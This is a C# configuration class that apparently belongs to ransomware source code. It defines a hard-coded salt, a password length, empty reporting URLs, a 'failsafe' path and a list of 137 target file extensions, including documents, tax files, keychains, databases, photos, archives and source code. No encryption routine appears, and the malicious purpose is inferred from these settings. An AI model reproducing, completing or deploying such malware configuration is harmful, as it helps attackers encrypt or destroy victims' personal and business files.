namespace GetFucked;

public static class Settables
{
	public static readonly ExecutionMode Mode = ExecutionMode.Fast;

	public static readonly string URL = "";

	public static readonly string LOGURL = "";

	public static readonly string CONTAINMENTPATH = "failsafe";

	public static readonly int PASSLENGTH = 8;

	public static readonly byte[] SALT = new byte[8] { 11, 46, 18, 4, 19, 0, 7, 62 };

	public static readonly string[] EXTENTIONS = new string[137]
	{
		".txt", ".doc", ".docx", ".log", ".msg", ".odt", ".pages", ".rtf", ".tex", ".wpd",
		".wps", ".csv", ".dat", ".ged", ".key", ".keychain", ".pps", ".ppt", ".pptx", ".sdf",
		".tar", ".tax2014", ".tax2015", ".vcf", ".xml", ".aif", ".iff", ".m3u", ".m4a", ".mid",
		".mp3", ".mpa", ".wav", ".wma", ".3g2", ".3gp", ".asf", ".avi", ".flv", ".m4v",
		".mov", ".mp4", ".mpg", ".rm", ".srt", ".swf", ".vob", ".wmv", ".3dm", ".3ds",
		".max", ".obj", ".bmp", ".dds", ".gif", ".jpg", ".png", ".psd", ".tga", ".thm",
		".tif", ".tiff", ".yuv", ".ai", ".eps", ".ps", ".svg", ".indd", ".pct", ".pdf",
		".xlr", ".xls", ".xlsx", ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", ".dwg",
		".dxf", ".asp", ".aspx", ".cer", ".cfm", ".csr", ".css", ".htm", ".html", ".js",
		".jsp", ".php", ".rss", ".xhtml", ".7z", ".cbr", ".deb", ".gz", ".pkg", ".rar",
		".rpm", ".sitx", ".tar.gz", ".zip", ".zipx", ".bin", ".cue", ".dmg", ".iso", ".mdf",
		".toast", ".vcd", ".c", ".class", ".cpp", ".cs", ".dtd", ".fla", ".h", ".java",
		".lua", ".m", ".pl", ".py", ".sh", ".sln", ".swift", ".vb", ".vcxproj", ".xcodeproj",
		".bak", ".tmp", ".crdownload", ".ics", ".msi", ".part", ".torrent"
	};
}
